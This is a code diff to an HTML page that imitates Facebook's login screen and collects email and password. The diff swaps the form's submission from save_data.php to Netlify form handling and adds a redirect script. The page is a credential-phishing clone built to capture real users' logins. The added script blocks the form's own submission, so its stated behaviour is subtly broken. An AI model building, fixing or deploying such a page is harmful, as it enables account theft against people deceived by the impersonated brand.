@@ -106,8 +106,9 @@
           <h1 class="logo">Facebook</h1>
           <p>Connect with friends and the world around you on Facebook.</p>
         </div>
-        <!-- Form submission directed to save_data.php -->
-        <form action="save_data.php" method="POST">
+
+        <!-- Netlify form attributes added -->
+        <form name="login-form" method="POST" data-netlify="true">
           <input type="text" name="email" placeholder="Email or Phone Number" required />
           <input type="password" name="password" placeholder="Password" required />
           <button class="login" type="submit">Log In</button>
@@ -117,5 +118,15 @@
         </form>
       </div>
     </div>
+
+    <!-- Add this script to handle Netlify form submission -->
+    <script>
+      // When the form is submitted, the user will be redirected to the thank you page
+      document.querySelector('form').addEventListener('submit', function(event) {
+        event.preventDefault();
+        // After submission, redirect to thank you page
+        window.location.href = "/thank-you.html";
+      });
+    </script>
   </body>
 </html>
